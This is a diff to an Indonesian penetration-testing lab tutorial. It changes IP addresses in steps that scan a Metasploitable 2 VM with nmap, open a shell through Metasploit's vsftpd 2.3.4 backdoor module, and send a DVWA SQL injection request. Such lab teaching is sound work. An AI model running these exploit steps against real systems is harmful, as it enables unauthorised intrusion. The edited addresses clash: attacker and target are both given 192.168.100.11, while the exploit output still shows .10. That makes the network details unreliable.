@@ -28,8 +28,8 @@ Modul ini akan menggunakan lingkungan lab yang telah dibangun sebelumnya dan men
 
 **2. Mesin Virtual yang Sudah Ada:**
 
-  * **Kali Linux VM** (Penyerang) | IP: `192.168.100.10`
-![ip kalilinux.png](images/ip%20kalilinux.png)
+  * **Kali Linux VM** (Penyerang) | IP: `192.168.100.11`
+![ip kali linux.png](images/ip%20kali%20linux.png)
   * **Security Onion VM** (Pemantau) | IP: `192.168.100.100`
 ![ip security onion.png](images/ip%20security%20onion.png)
 **3. Mesin Virtual Baru (Target Tambahan):**
@@ -77,7 +77,7 @@ Modul ini akan menggunakan lingkungan lab yang telah dibangun sebelumnya dan men
 4.  **Nyalakan dan Login**:
       * Nyalakan VM. Ia akan boot ke layar login.
       * Login dengan kredensial default: `msfadmin` / `msfadmin`.
-5.  **Verifikasi IP**: Buka terminal dan ketik `ifconfig`. Anda akan melihat IP address yang didapat (biasanya `192.168.100.101` jika DHCP server tidak ada). Kita akan menggunakan IP ini sebagai target.
+5.  **Verifikasi IP**: Buka terminal dan ketik `ifconfig`. Anda akan melihat IP address yang didapat (biasanya `192.168.100.11` jika DHCP server tidak ada). Kita akan menggunakan IP ini sebagai target.
 
 #### **3.2. Fase Reconnaissance (Menggunakan Kali Linux)**
 
@@ -86,7 +86,7 @@ Sebelum menyerang, kita harus tahu apa yang kita serang. Ulangi proses reconnais
 1.  Buka terminal di **Kali Linux**.
 2.  Jalankan scan Nmap yang detail pada target Metasploitable 2:
     ```bash
-    sudo nmap -sS -sV -p- --min-rate=1000 -Pn -oN metasploitable_scan.txt 192.168.100.101
+    sudo nmap -sS -sV -p- --min-rate=1000 -Pn -oN metasploitable_scan.txt 192.168.100.11
     ```
     ![gambar2.png](images/gambar2.png)
 3.  Analisis hasilnya. Buka file `metasploitable_scan.txt`. Anda akan melihat **banyak sekali** port yang terbuka. Cari entri yang menarik. Sebagai contoh, Anda akan menemukan baris seperti ini:
@@ -155,8 +155,8 @@ Sekarang kita akan menggunakan Metasploit untuk mengeksploitasi kerentanan `vsft
 5.  **Atur Target**: Set opsi `RHOSTS` ke alamat IP Metasploitable 2.
 
     ```bash
-    msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.100.101
-    RHOSTS => 192.168.100.101
+    msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.100.11
+    RHOSTS => 192.168.100.11
     ```
     ![gambar8.png](images/gambar8.png)
 
@@ -165,9 +165,9 @@ Sekarang kita akan menggunakan Metasploit untuk mengeksploitasi kerentanan `vsft
     ```bash
     msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 
-    [*] 192.168.100.101:21 - Banner: 220 (vsFTPd 2.3.4)
-    [*] 192.168.100.101:21 - USER: Backdoor trigger sent.
-    [*] Command shell session 1 opened (192.168.100.10:43215 -> 192.168.100.101:6200) at 2025-10-21 11:30:00 -0500
+    [*] 192.168.100.11:21 - Banner: 220 (vsFTPd 2.3.4)
+    [*] 192.168.100.11:21 - USER: Backdoor trigger sent.
+    [*] Command shell session 1 opened (192.168.100.10:43215 -> 192.168.100.11:6200) at 2025-10-21 11:30:00 -0500
     ```
 ![gambar9.png](images/gambar9.png)
 
@@ -279,7 +279,7 @@ Metasploitable 2 memiliki aplikasi web yang sengaja rentan bernama *Damn Vulnera
 
     ```http
     GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
-    Host: 192.168.100.101
+    Host: 192.168.100.11
     ... (headers lainnya) ...
     ```
 
